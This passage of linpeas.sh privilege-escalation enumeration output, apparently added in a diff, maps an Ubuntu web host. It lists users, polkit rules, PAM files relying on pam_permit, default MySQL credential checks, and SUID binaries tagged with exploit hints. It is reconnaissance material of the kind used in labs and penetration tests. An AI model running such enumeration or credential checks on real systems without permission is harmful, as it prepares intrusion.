+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html#pe---method-2                                           
+                                                                                                                                                                      
+══╣ Polkit Binary
+                                                                                                                                                                      
+══╣ Polkit Policies
+Checking /etc/polkit-1/rules.d/:                                                                                                                                      
+Checking /usr/share/polkit-1/rules.d/:
+polkit.addAdminRule(function(action, subject) {
+    return ["unix-group:sudo", "unix-group:admin"];
+});
+/* -*- mode: js; js-indent-level: 4; indent-tabs-mode: nil -*- */
+
+// DO NOT EDIT THIS FILE, it will be overwritten on update
+//
+// Default rules for polkit
+//
+// See the polkit(8) man page for more information
+// about configuring polkit.
+
+polkit.addAdminRule(function(action, subject) {
+    return ["unix-group:sudo"];
+});
+polkit.addRule(function(action, subject) {
+    if ((action.id == "org.freedesktop.packagekit.upgrade-system" ||
+         action.id == "org.freedesktop.packagekit.trigger-offline-update") &&
+        subject.active == true && subject.local == true &&
+        subject.isInGroup("sudo")) {
+            return polkit.Result.YES;
+    }
+});
+// This file is part of systemd.
+// See systemd-networkd.service(8) and polkit(8) for more information.
+
+// Allow systemd-networkd to set timezone, get product UUID,
+// and transient hostname
+polkit.addRule(function(action, subject) {
+    if ((action.id == "org.freedesktop.hostname1.set-hostname" ||
+         action.id == "org.freedesktop.hostname1.get-product-uuid" ||
+         action.id == "org.freedesktop.timedate1.set-timezone") &&
+        subject.user == "systemd-network") {
+        return polkit.Result.YES;
+    }
+});
+
+══╣ Polkit Authentication Agent
+                                                                                                                                                                      
+╔══════════╣ Superusers and UID 0 Users
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html                                                         
+                                                                                                                                                                      
+══╣ Users with UID 0 in /etc/passwd
+root:x:0:0:root:/root:/bin/bash                                                                                                                                       
+
+══╣ Users with sudo privileges in sudoers
+                                                                                                                                                                      
+╔══════════╣ Users with console
+adalberto:x:1001:1001:User:/home/adalberto:/bin/bash
+root:x:0:0:root:/root:/bin/bash
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+
+╔══════════╣ All users & groups
+uid=0(root) gid=0(root) groups=0(root)
+uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
+uid=10(uucp) gid=10(uucp) groups=10(uucp)
+uid=100(mysql) gid=101(mysql) groups=101(mysql)
+uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev)
+uid=1001(adalberto) gid=1001(adalberto) groups=1001(adalberto)
+uid=101(messagebus) gid=103(messagebus) groups=103(messagebus)
+uid=13(proxy) gid=13(proxy) groups=13(proxy)
+uid=2(bin) gid=2(bin) groups=2(bin)
+uid=3(sys) gid=3(sys) groups=3(sys)
+uid=33(www-data) gid=33(www-data) groups=33(www-data),101(mysql)
+uid=34(backup) gid=34(backup) groups=34(backup)
+uid=38(list) gid=38(list) groups=38(list)
+uid=39(irc) gid=39(irc) groups=39(irc)
+uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
+uid=42(_apt) gid=65534(nogroup) groups=65534(nogroup)
+uid=5(games) gid=60(games) groups=60(games)
+uid=6(man) gid=12(man) groups=12(man)
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+uid=7(lp) gid=7(lp) groups=7(lp)
+uid=8(mail) gid=8(mail) groups=8(mail)
+uid=9(news) gid=9(news) groups=9(news)
+uid=995(polkitd) gid=995(polkitd) groups=995(polkitd)
+uid=996(systemd-resolve) gid=996(systemd-resolve) groups=996(systemd-resolve)
+uid=997(systemd-timesync) gid=997(systemd-timesync) groups=997(systemd-timesync)
+uid=998(systemd-network) gid=998(systemd-network) groups=998(systemd-network)
+
+╔══════════╣ Currently Logged in Users
+                                                                                                                                                                      
+══╣ Basic user information
+ 13:43:14 up 31 min,  0 user,  load average: 3.30, 2.41, 1.44                                                                                                         
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU  WHAT
+
+══╣ Active sessions
+ 13:43:14 up 31 min,  0 user,  load average: 3.30, 2.41, 1.44
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU  WHAT
+
+══╣ Logged in users (utmp)
+                                                                                                                                                                      
+══╣ SSH sessions
+                                                                                                                                                                      
+══╣ Screen sessions
+                                                                                                                                                                      
+══╣ Tmux sessions
+                                                                                                                                                                      
+╔══════════╣ Last Logons and Login History
+                                                                                                                                                                      
+══╣ Last logins
+                                                                                                                                                                      
+wtmp begins Fri Jan 16 01:24:23 2026
+
+══╣ Failed login attempts
+                                                                                                                                                                      
+══╣ Recent logins from auth.log (limit 20)
+                                                                                                                                                                      
+══╣ Last time logon each user
+Username         Port     From                                       Latest                                                                                           
+
+╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)
+                                                                                                                                                                      
+╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
+                                                                                                                                                                      
+
+
+                             ╔══════════════════════╗                                                                                                                 
+═════════════════════════════╣ Software Information ╠═════════════════════════════                                                                                    
+                             ╚══════════════════════╝                                                                                                                 
+╔══════════╣ Useful software
+/usr/bin/base64                                                                                                                                                       
+/usr/bin/curl
+/usr/bin/g++
+/usr/bin/gcc
+/usr/bin/make
+/usr/bin/perl
+/usr/bin/php
+/usr/bin/python3
+/usr/bin/sudo
+/usr/bin/wget
+
+╔══════════╣ Installed Compilers
+ii  clang                            1:18.0-59~exp2                    amd64        C, C++ and Objective-C compiler (LLVM based), clang binary                        
+ii  clang-18                         1:18.1.3-1ubuntu1                 amd64        C, C++ and Objective-C compiler
+ii  g++                              4:13.2.0-7ubuntu1                 amd64        GNU C++ compiler
+ii  g++-13                           13.3.0-6ubuntu2~24.04             amd64        GNU C++ compiler
+ii  g++-13-x86-64-linux-gnu          13.3.0-6ubuntu2~24.04             amd64        GNU C++ compiler for x86_64-linux-gnu architecture
+ii  g++-x86-64-linux-gnu             4:13.2.0-7ubuntu1                 amd64        GNU C++ compiler for the amd64 architecture
+ii  gcc                              4:13.2.0-7ubuntu1                 amd64        GNU C compiler
+ii  gcc-13                           13.3.0-6ubuntu2~24.04             amd64        GNU C compiler
+ii  gcc-13-x86-64-linux-gnu          13.3.0-6ubuntu2~24.04             amd64        GNU C compiler for the x86_64-linux-gnu architecture
+ii  gcc-x86-64-linux-gnu             4:13.2.0-7ubuntu1                 amd64        GNU C compiler for the amd64 architecture
+ii  llvm-18                          1:18.1.3-1ubuntu1                 amd64        Modular compiler and toolchain technologies
+ii  llvm-18-linker-tools             1:18.1.3-1ubuntu1                 amd64        Modular compiler and toolchain technologies - Plugins
+ii  llvm-18-runtime                  1:18.1.3-1ubuntu1                 amd64        Modular compiler and toolchain technologies, IR interpreter
+ii  rpcsvc-proto                     1.4.2-0ubuntu7                    amd64        RPC protocol compiler and definitions
+/usr/bin/gcc
+
+╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
+Apache version: Server version: Apache/2.4.58 (Ubuntu)
+Server built:   2025-08-11T11:10:09
+httpd Not Found
+                                                                                                                                                                      
+Nginx version: nginx Not Found
+                                                                                                                                                                      
+/etc/apache2/mods-available/php8.3.conf-<FilesMatch ".+\.ph(?:ar|p|tml)$">
+/etc/apache2/mods-available/php8.3.conf:    SetHandler application/x-httpd-php
+--
+/etc/apache2/mods-available/php8.3.conf-<FilesMatch ".+\.phps$">
+/etc/apache2/mods-available/php8.3.conf:    SetHandler application/x-httpd-php-source
+--
+/etc/apache2/mods-enabled/php8.3.conf-<FilesMatch ".+\.ph(?:ar|p|tml)$">
+/etc/apache2/mods-enabled/php8.3.conf:    SetHandler application/x-httpd-php
+--
+/etc/apache2/mods-enabled/php8.3.conf-<FilesMatch ".+\.phps$">
+/etc/apache2/mods-enabled/php8.3.conf:    SetHandler application/x-httpd-php-source
+══╣ PHP exec extensions
+drwxr-xr-x 1 root root 4096 Jan 15 10:56 /etc/apache2/sites-enabled
+drwxr-xr-x 1 root root 4096 Jan 15 10:56 /etc/apache2/sites-enabled
+lrwxrwxrwx 1 root root 35 Jan  7 19:09 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
+<VirtualHost *:80>
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/blogo
+        <Directory "/var/www/blogo/files">
+            Require local
+        </Directory>
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+</VirtualHost>
+
+
+-rw-r--r-- 1 root root 1364 Jan 15 10:56 /etc/apache2/sites-available/000-default.conf
+<VirtualHost *:80>
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/blogo
+        <Directory "/var/www/blogo/files">
+            Require local
+        </Directory>
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+</VirtualHost>
+lrwxrwxrwx 1 root root 35 Jan  7 19:09 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
+<VirtualHost *:80>
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/blogo
+        <Directory "/var/www/blogo/files">
+            Require local
+        </Directory>
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+</VirtualHost>
+
+-rw-r--r-- 1 root root 73718 Jul 14  2025 /etc/php/8.3/apache2/php.ini
+allow_url_fopen = On
+allow_url_include = Off
+odbc.allow_persistent = On
+mysqli.allow_persistent = On
+pgsql.allow_persistent = On
+-rw-r--r-- 1 root root 73714 Jul 14  2025 /etc/php/8.3/cli/php.ini
+allow_url_fopen = On
+allow_url_include = Off
+odbc.allow_persistent = On
+mysqli.allow_persistent = On
+pgsql.allow_persistent = On
+
+
+
+╔══════════╣ Browser Profiles
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#browser-data                                                                        
+                                                                                                                                                                      
+╔══════════╣ Searching docker files (limit 70)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/index.html#docker-breakout--privilege-escalation                               
+-rw-r--r-- 1 adalberto adalberto 101 Jul 23  2006 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/num_cpus-1.17.0/ci/cgroups/Dockerfile          
+
+╔══════════╣ Analyzing MariaDB Files (limit 70)
+                                                                                                                                                                      
+-rw------- 1 root root 317 Jan  7 19:09 /etc/mysql/debian.cnf
+
+╔══════════╣ Analyzing PAM Auth Files (limit 70)
+drwxr-xr-x 1 root root 4096 Jan 12 17:41 /etc/pam.d                                                                                                                   
+
+drwxr-xr-x 1 root root 4096 Jan 12 17:41 /etc/pam.d
+-rw-r--r-- 1 root root 1620 Jan 11 16:18 /etc/pam.d/common-password
+password        required                        pam_permit.so
+-rw-r--r-- 1 root root 4118 Apr  9  2024 /etc/pam.d/login
+-rw-r--r-- 1 root root 143 Mar  3  2024 /etc/pam.d/runuser
+auth            sufficient      pam_rootok.so
+-rw-r--r-- 1 root root 581 Feb 22  2024 /etc/pam.d/chsh
+auth            sufficient      pam_rootok.so
+-rw-r--r-- 1 root root 1242 Jan 11 16:18 /etc/pam.d/common-auth
+auth    [success=1 default=ignore]      pam_unix.so nullok
+auth    required                        pam_permit.so
+-rw-r--r-- 1 root root 92 Feb 22  2024 /etc/pam.d/newusers
+-rw-r--r-- 1 root root 1435 Jan 11 16:18 /etc/pam.d/common-session-noninteractive
+session [default=1]                     pam_permit.so
+session required                        pam_permit.so
+-rw-r--r-- 1 root root 1427 Jan 11 16:18 /etc/pam.d/common-session
+session [default=1]                     pam_permit.so
+session required                        pam_permit.so
+-rw-r--r-- 1 root root 520 Oct 13  2022 /etc/pam.d/other
+-rw-r--r-- 1 root root 1208 Jan 11 16:18 /etc/pam.d/common-account
+account required                        pam_permit.so
+-rw-r--r-- 1 root root 138 Mar  3  2024 /etc/pam.d/runuser-l
+-rw-r--r-- 1 root root 92 Feb 22  2024 /etc/pam.d/chpasswd
+-rw-r--r-- 1 root root 2259 Mar  3  2024 /etc/pam.d/su
+auth       sufficient pam_rootok.so
+-rw-r--r-- 1 root root 384 Feb 22  2024 /etc/pam.d/chfn
+auth            sufficient      pam_rootok.so
+-rw-r--r-- 1 root root 137 Mar  3  2024 /etc/pam.d/su-l
+-rw-r--r-- 1 root root 92 Feb 22  2024 /etc/pam.d/passwd
+-rw-r--r-- 1 root root 330 Jan 29  2024 /etc/pam.d/sudo
+-rw-r--r-- 1 root root 315 Jan 29  2024 /etc/pam.d/sudo-i
+
+
+╔══════════╣ Analyzing Ldap Files (limit 70)
+The password hash is from the {SSHA} to 'structural'                                                                                                                  
+drwxr-xr-x 2 root root 4096 Jan  7 19:05 /etc/ldap
+
+
+╔══════════╣ Analyzing Keyring Files (limit 70)
+drwxr-xr-x 2 root root 4096 Mar 31  2024 /etc/apt/keyrings                                                                                                            
+drwxr-xr-x 2 root root 4096 May 28  2025 /usr/share/keyrings
+
+
+
+
+╔══════════╣ Analyzing Proxy Config Files (limit 70)
+-rw-r--r-- 1 root root 106 May 28  2025 /etc/environment                                                                                                              
+
+
+
+╔══════════╣ Analyzing Github Files (limit 70)
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/ahash-0.8.12/.github                          
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/aho-corasick-1.1.4/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/anyhow-1.0.100/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/async-trait-0.1.89/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/bitflags-1.3.2/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.11.0/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/cargo_metadata-0.15.4/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/cfg-if-1.0.4/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/console-0.15.11/.github
+drwxrwxr-x 4 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/crossterm-0.25.0/.github
+drwxrwxr-x 4 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/crossterm-0.27.0/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/either-1.15.0/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/equivalent-1.0.2/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/erased-serde-0.3.31/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/errno-0.3.14/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/filetime-0.2.26/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/hostname-0.3.1/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/humantime-2.3.0/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/iana-time-zone-0.1.64/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/indexmap-2.13.0/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/indicatif-0.17.11/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/itertools-0.11.0/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/itoa-1.0.17/.github
+drwxrwxr-x 4 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/jobserver-0.1.34/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/libbpf-sys-1.6.2+v1.6.2/.github
+drwxrwxr-x 4 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/libbpf-sys-1.6.2+v1.6.2/libbpf/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/libbpf-sys-1.6.2+v1.6.2/zlib/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/log-0.4.29/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/memmap2-0.5.10/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/memoffset-0.6.5/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/num_cpus-1.17.0/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/once_cell-1.21.3/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/parking_lot-0.12.5/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/pkg-config-0.3.32/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/proc-macro2-1.0.105/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/quote-1.0.43/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/rustversion-1.0.22/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/scopeguard-1.2.0/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/semver-1.0.27/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/serde_json-1.0.149/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/shlex-1.3.0/.github
+drwxrwxr-x 4 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/signal-hook-0.3.18/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/slog-2.8.2/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/slog-term-2.9.2/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/smallvec-1.15.1/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/tar-0.4.44/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/term-1.2.1/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/terminal_size-0.4.3/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/thiserror-1.0.69/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/thread_local-1.1.9/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/unicase-2.9.0/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/unicode-ident-1.0.22/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/version_check-0.9.5/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/walkdir-2.5.0/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/xattr-1.6.1/.github
+drwxrwxr-x 3 adalberto adalberto 4096 Jan 12 17:27 /home/adalberto/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/zmij-1.0.13/.github
+
+
+
+
+╔══════════╣ Analyzing FTP Files (limit 70)
+                                                                                                                                                                      
+
+
+-rw-r--r-- 1 root root 69 Jul 14  2025 /etc/php/8.3/mods-available/ftp.ini
+-rw-r--r-- 1 root root 69 Jul 14  2025 /usr/share/php8.3-common/common/ftp.ini
+
+
+
+
+
+
+╔══════════╣ Analyzing Other Interesting Files (limit 70)
+-rw-r--r-- 1 root root 3771 Mar 31  2024 /etc/skel/.bashrc                                                                                                            
+-rw-r--r-- 1 adalberto adalberto 3792 Jan 12 17:24 /home/adalberto/.bashrc
+
+
+
+
+
+-rw-r--r-- 1 root root 807 Mar 31  2024 /etc/skel/.profile
+-rw-r--r-- 1 adalberto adalberto 828 Jan 12 17:24 /home/adalberto/.profile
+
+
+
+
+╔══════════╣ Analyzing Windows Files (limit 70)
+                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+lrwxrwxrwx 1 root root 20 Jan  7 19:09 /etc/alternatives/my.cnf -> /etc/mysql/mysql.cnf
+lrwxrwxrwx 1 root root 24 Oct 20  2020 /etc/mysql/my.cnf -> /etc/alternatives/my.cnf
+-rw-r--r-- 1 root root 81 Jan  7 19:09 /var/lib/dpkg/alternatives/my.cnf
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+╔══════════╣ Searching mysql credentials and exec
+From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user              = mysql
+Found readable /etc/mysql/my.cnf
+!includedir /etc/mysql/conf.d/
+!includedir /etc/mysql/mysql.conf.d/
+
+╔══════════╣ MySQL version
+mysql  Ver 8.0.44-0ubuntu0.24.04.2 for Linux on x86_64 ((Ubuntu))                                                                                                     
+
+
+═╣ MySQL connection using default root/root ........... No
+═╣ MySQL connection using root/toor ................... No                                                                                                            
+═╣ MySQL connection using root/NOPASS ................. No                                                                                                            
+                                                                                                                                                                      
+MySQL is running as user 'mysql' with version 8.0.44.
+╔══════════╣ Analyzing PGP-GPG Files (limit 70)
+/usr/bin/gpg                                                                                                                                                          
+netpgpkeys Not Found
+netpgp Not Found                                                                                                                                                      
+                                                                                                                                                                      
+-rw-r--r-- 1 root root 1165 Nov 27  2023 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg
+-rw-r--r-- 1 root root 1167 Nov 27  2023 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg
+
+
+
+
+
+
+
+
+
+
+╔══════════╣ Searching uncommon passwd files (splunk)
+passwd file: /etc/pam.d/passwd                                                                                                                                        
+passwd file: /etc/passwd
+passwd file: /usr/share/lintian/overrides/passwd
+
+╔══════════╣ Searching ssl/ssh files
+══╣ Some certificates were found (out limited):
+/etc/ssl/certs/ACCVRAIZ1.pem
+/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
+/etc/ssl/certs/AC_RAIZ_FNMT-RCM_SERVIDORES_SEGUROS.pem
+/etc/ssl/certs/ANF_Secure_Server_Root_CA.pem
+/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
+/etc/ssl/certs/AffirmTrust_Commercial.pem
+/etc/ssl/certs/AffirmTrust_Networking.pem
+/etc/ssl/certs/AffirmTrust_Premium.pem
+/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
+/etc/ssl/certs/Amazon_Root_CA_1.pem
+/etc/ssl/certs/Amazon_Root_CA_2.pem
+/etc/ssl/certs/Amazon_Root_CA_3.pem
+/etc/ssl/certs/Amazon_Root_CA_4.pem
+/etc/ssl/certs/Atos_TrustedRoot_2011.pem
+/etc/ssl/certs/Atos_TrustedRoot_Root_CA_ECC_TLS_2021.pem
+/etc/ssl/certs/Atos_TrustedRoot_Root_CA_RSA_TLS_2021.pem
+/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
+/etc/ssl/certs/BJCA_Global_Root_CA1.pem
+/etc/ssl/certs/BJCA_Global_Root_CA2.pem
+/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
+
+
+
+
+
+
+                      ╔════════════════════════════════════╗
+══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                                    
+                      ╚════════════════════════════════════╝                                                                                                          
+╔══════════╣ SUID - Check easy privesc, exploits and write perms
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                       
+strace Not Found                                                                                                                                                      
+-rwsr-xr-x 1 root root 19K Dec  2  2024 /usr/lib/polkit-1/polkit-agent-helper-1
+-rwsr-xr-- 1 root messagebus 35K Aug  8  2024 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 51K Sep 15 21:08 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+-rwsr-xr-x 1 root root 44K May 30  2024 /usr/bin/chsh
+-rwsr-xr-x 1 root root 40K May 30  2024 /usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-xr-x 1 root root 55K Sep 15 21:08 /usr/bin/su
+-rwsr-xr-x 1 root root 39K Sep 15 21:08 /usr/bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-x 1 root root 75K May 30  2024 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 72K May 30  2024 /usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-x 1 root root 63K May 30  2024 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+-rwsr-xr-x 1 root root 272K Jun 25  2025 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
+
+╔══════════╣ SGID
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                       
+-rwxr-sr-x 1 root shadow 27K May  2  2024 /usr/sbin/pam_extrausers_chkpwd
+-rwxr-sr-x 1 root shadow 31K May  2  2024 /usr/sbin/unix_chkpwd
+-rwxr-sr-x 1 root shadow 71K May 30  2024 /usr/bin/chage
+-rwxr-sr-x 1 root shadow 27K May 30  2024 /usr/bin/expiry
+
+╔══════════╣ Files with ACLs (limited to 50)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#acls                                                                                
+files with acls in searched folders Not Found                                                                                                                         
+                                                                                                                                                                      
+╔══════════╣ Capabilities
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities                                                                        
+══╣ Current shell capabilities                                                                                                                                        
+./linpeas.sh: 8622: [[: not found                                                                                                                                     
+CapInh:  [Invalid capability format]
+./linpeas.sh: 8622: [[: not found
+CapPrm:  [Invalid capability format]
+./linpeas.sh: 8613: [[: not found
